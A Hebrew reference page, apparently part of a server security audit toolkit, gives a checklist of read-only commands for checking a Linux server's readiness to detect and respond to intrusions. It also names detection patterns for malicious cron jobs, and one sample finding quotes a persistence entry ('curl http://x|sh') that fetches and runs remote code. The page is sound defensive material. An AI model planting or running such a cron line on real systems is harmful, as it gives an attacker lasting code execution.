# מוכנות לאירוע (Incident Readiness) — deep dive

קטגוריה: `incident`. לא "האם קרה אירוע", אלא **האם השרת מוכן לזהות ולהגיב** לאירוע — חשד לפריצה, key שדלף,
משתמש לא מוכר, תעבורה מוזרה, DB חשוף, container לא מוכר. ברובו checklist מוכנות + סריקת חריגות קלה.

## מה זה
תהליך התגובה לאירוע. בזמן בדיקה, גם סורקים סימני-חריגה קלים (read-only) שמצביעים על אירוע אפשרי או על
חוסר-מוכנות לזהות אותו.

## פריטי ביקורת + פקודות read-only

### 1. יכולת זיהוי — משתמשים/תהליכים לא מוכרים 🟡
- משתמשים: `getent passwd | awk -F: '$3>=1000 && $7 ~ /sh$/ {print $1}'` — משתמש login לא מוכר → לדגל.
- uid 0 כפול: `getent passwd | awk -F: '$3==0{print}'` (אמור להיות רק root).
- כניסות אחרונות: `last -20 2>/dev/null`, נכשלות: `sudo lastb 2>/dev/null | head`.

### 2. containers / שירותים לא מוכרים 🟡
- `docker ps -a --format '{{.Names}}\t{{.Image}}\t{{.Status}}'` — image/שם לא מוכר, container שנוצר לאחרונה
  בלי הסבר → לדגל. images: `docker images`.
- שירותים: `systemctl list-units --type=service --state=running 2>/dev/null` — שירות חריג.

### 3. cron / persistence לא מוכר 🟡
- `crontab -l 2>/dev/null`, `sudo ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null`,
  `sudo cat /etc/cron.d/* 2>/dev/null`. ערך cron חשוד (סקריפט לא מוכר, curl|sh, base64) → 🔴.
- systemd timers חריגים: `systemctl list-timers --all 2>/dev/null`.

### 4. קבצים שהשתנו לאחרונה באזורי-מערכת 🔵
- `sudo find /etc /usr/local/bin /root -type f -mtime -7 -printf '%TY-%Tm-%Td %p\n' 2>/dev/null | head` —
  שינויים לא מוסברים ב-7 ימים אחרונים → לבדיקה.
- מאזינים לא צפויים: צולב מול `ss -tlnp` (ref 03).

### 5. שלמות לוגים ל-forensics 🟡
- שמירת לוגים מספקת (ref 08) = תנאי ליכולת חקירה. אין auth.log/journald נשמר → 🟡 (אי אפשר לשחזר אירוע).
- runbook/תיעוד: עדות לתהליך תגובה (קובץ INCIDENT/RUNBOOK ב-repos) — קיומו 🔵 חיובי; היעדרו = המלצה.

## חוק ברזל
> לא מתעלמים, לא מוחקים לוגים. מחליפים סיסמאות ו-secrets, סוגרים גישה ציבורית, משחזרים מגיבוי נקי,
> מבינים איך קרה ומתקנים את הסיבה, מתעדים. אחרי אירוע לא מספיק "לכבות ולהדליק".

## דוגמאות פלט
```text
🔴 [incident] `cat /etc/cron.d/*` → "* * * * * curl http://x|sh" — cron מוריד ומריץ קוד חיצוני, סימן persistence של תוקף. תיקון: בידוד מיידי, חקירה, שחזור מגיבוי נקי.
🟡 [incident] `getent passwd` → משתמש login "ftpuser" לא מוכר עם uid 0 — חשבון בעל הרשאות-על לא מתועד. תיקון: לאמת מקור, לחסום אם לא לגיטימי.
🟡 [incident] אין auth.log נשמר + אין runbook — אין יכולת לחקור אירוע. תיקון: שמירת לוגים (ref 08) + מסמך תגובה לאירוע.
🔵 [incident] `find /etc -mtime -7` → sshd_config שונה לפני יומיים — שינוי לא מוסבר, לאמת שהיה מכוון.
```
